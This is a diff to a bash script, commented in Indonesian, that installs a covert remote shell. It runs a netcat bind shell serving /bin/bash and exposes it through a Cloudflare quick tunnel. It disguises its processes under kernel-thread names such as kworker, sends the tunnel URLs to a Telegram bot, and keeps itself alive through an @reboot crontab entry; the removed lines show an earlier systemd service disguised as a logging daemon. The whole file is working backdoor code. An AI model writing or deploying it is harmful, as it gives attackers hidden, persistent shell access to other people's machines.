@@ -92,7 +92,7 @@ download_cloudflared() {
     echo "$out"
 }
 
-# ========== BIND SHELL (LISTEN LOCALHOST) ==========
+# ========== BIND SHELL (LISTEN LOCALHOST) DENGAN SETSID ==========
 start_bindshell() {
     local port="$1"
     local bind_cmd
@@ -105,15 +105,16 @@ start_bindshell() {
     else
         bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
     fi
-    ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
+    # Gunakan setsid untuk memastikan proses tidak bergantung pada terminal
+    setsid bash -c "exec -a '$PROC_HIDDEN_NAME' $bind_cmd" >/dev/null 2>&1 &
     echo $!
 }
 
-# ========== START TUNNEL (langsung, tanpa monitor) ==========
+# ========== START TUNNEL (langsung, tanpa monitor) DENGAN SETSID ==========
 start_tunnel_direct() {
     local port="$1"
     local bin="$2"
-    ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> "$TMPDIR/cloudflared.log" 2>&1 ) &
+    setsid bash -c "exec -a '$PROC_HIDDEN_NAME' '$bin' tunnel --url 'tcp://127.0.0.1:${port}'" >> "$TMPDIR/cloudflared.log" 2>&1 &
     echo $!
 }
 
@@ -146,8 +147,8 @@ send_telegram() {
 }
 
 while true; do
-    # Jalankan tunnel, arahkan stdout+stderr ke log
-    exec -a "\$PROC_NAME" "\$BIN" tunnel --url "tcp://127.0.0.1:\$PORT" 2>&1 | while IFS= read -r line; do
+    # Jalankan tunnel dengan setsid agar tidak bergantung pada terminal
+    setsid bash -c "exec -a \"\$PROC_NAME\" \"\$BIN\" tunnel --url \"tcp://127.0.0.1:\$PORT\"" 2>&1 | while IFS= read -r line; do
         echo "\$line" >> "\$TMPDIR/cloudflared.log"
         if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="\${BASH_REMATCH[0]}"
@@ -166,33 +167,11 @@ EOF
     echo "$script_path"
 }
 
-# ========== INSTALL PERSISTENCE (systemd/cron) ==========
+# ========== INSTALL PERSISTENCE (crontab) ==========
 install_persistence() {
     local script_path="$1"
-    local service_name="cf-tunnel"
-    # Cek apakah systemd user tersedia (dengan silent)
-    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null 2>&1; then
-        mkdir -p "${HOME}/.config/systemd/user"
-        cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
-[Unit]
-Description=System Logging Daemon
-After=network.target
-
-[Service]
-ExecStart=$script_path
-Restart=always
-RestartSec=10
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=default.target
-EOF
-        systemctl --user daemon-reload 2>/dev/null || true
-        systemctl --user enable "$service_name" 2>/dev/null || true
-        systemctl --user start "$service_name" 2>/dev/null || true
-        return 0
-    elif command -v crontab >/dev/null; then
+    # Selalu gunakan crontab (systemd user sering bermasalah)
+    if command -v crontab >/dev/null; then
         (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
         return 0
     else
@@ -202,21 +181,18 @@ EOF
 
 # ========== UNINSTALL (dengan token) ==========
 uninstall() {
-    # Baca token yang tersimpan
     local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
     if [[ ! -f "$token_file" ]]; then
         echo "No installation found or token missing."
         exit 1
     fi
     local stored_token=$(cat "$token_file")
-    # Cek variabel lingkungan CF_UNINSTALL
     if [[ -z "${CF_UNINSTALL:-}" ]] || [[ "$CF_UNINSTALL" != "$stored_token" ]]; then
         echo "Invalid uninstall token. Use CF_UNINSTALL=<token> bash -c ..."
         exit 1
     fi
 
     print_step "Removing installed files..."
-    # Baca file konfigurasi PID jika ada
     local conf_file="${HOME}/.${CONFIG_DIR}/tunnel.conf"
     if [[ -f "$conf_file" ]]; then
         source "$conf_file"
@@ -227,12 +203,6 @@ uninstall() {
     pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
     pkill -f "cf_tunnel.sh" 2>/dev/null || true
     crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
-    if command -v systemctl >/dev/null; then
-        systemctl --user stop cf-tunnel.service 2>/dev/null || true
-        systemctl --user disable cf-tunnel.service 2>/dev/null || true
-        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
-        systemctl --user daemon-reload 2>/dev/null || true
-    fi
     rm -rf "${HOME}/.${CONFIG_DIR}"
     rm -rf "$TMPDIR"
     finish_ok
@@ -240,26 +210,40 @@ uninstall() {
     exit 0
 }
 
-# ========== FORCE REMOVE OLD INSTALLATION ==========
+# ========== FORCE CLEANUP OLD INSTALLATION (AMAN) ==========
 force_cleanup_old() {
     warn "Menghapus instalasi lama (jika ada)..."
-    # Matikan proses palsu milik user ini
-    pkill -u "$UID" -f "\[(kworker|rcu|ksoftirqd|slub_flushwq|kcompactd|kswapd|jbd2|ext4)" 2>/dev/null || true
-    pkill -u "$UID" -f "systemd-logind" 2>/dev/null || true
+
+    # 1. Matikan proses yang jelas milik instalasi kita
+    pkill -u "$UID" -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
     pkill -u "$UID" -f "cf_tunnel.sh" 2>/dev/null || true
-    # Hapus crontab
+    pkill -u "$UID" -f "cloudflared.*tunnel" 2>/dev/null || true
+    pkill -u "$UID" -f "socat.*TCP-LISTEN" 2>/dev/null || true
+    pkill -u "$UID" -f "nc.*-l.*-e" 2>/dev/null || true
+    pkill -u "$UID" -f "ncat.*-l" 2>/dev/null || true
+
+    # 2. Proses palsu yang menyamar dengan nama kernel
+    #    Hanya bunuh jika command line-nya mengandung ciri khas tunnel/bindshell
+    ps -u "$UID" -o pid=,comm=,args= | grep -E '\[(kworker|rcu|ksoftirqd|slub_flushwq|kcompactd|kswapd|jbd2|ext4)\]' | \
+    while read pid comm rest; do
+        if echo "$rest" | grep -qE '(tunnel --url|TCP-LISTEN|EXEC:/bin/bash)'; then
+            kill -9 "$pid" 2>/dev/null || true
+        fi
+    done
+
+    # 3. Hapus crontab
     crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
-    # Hapus direktori konfigurasi
+
+    # 4. Hapus direktori konfigurasi
     rm -rf "${HOME}/.${CONFIG_DIR}" 2>/dev/null || true
     rm -rf "/tmp/.${CONFIG_DIR}-${UID}" 2>/dev/null || true
     rm -rf "$TMPDIR" 2>/dev/null || true
 }
 
 # ========== MAIN ==========
-# Cek uninstall dengan token
 [[ -n "${CF_UNINSTALL:-}" ]] && uninstall
 
-# Jika tidak dalam mode uninstall, bersihkan instalasi lama
+# Bersihkan instalasi lama (jika ada)
 force_cleanup_old
 
 rm -rf "$TMPDIR" 2>/dev/null || true
@@ -373,7 +357,7 @@ if [[ -z "${GS_NOINST:-}" ]]; then
     if install_persistence "$persistence_script"; then
         info "Persistence installed (will send new URLs via Telegram after reboot)."
     else
-        warn "Persistence not installed (no systemd/cron). Tunnel will not survive reboot."
+        warn "Persistence not installed (no crontab). Tunnel will not survive reboot."
     fi
 fi
 
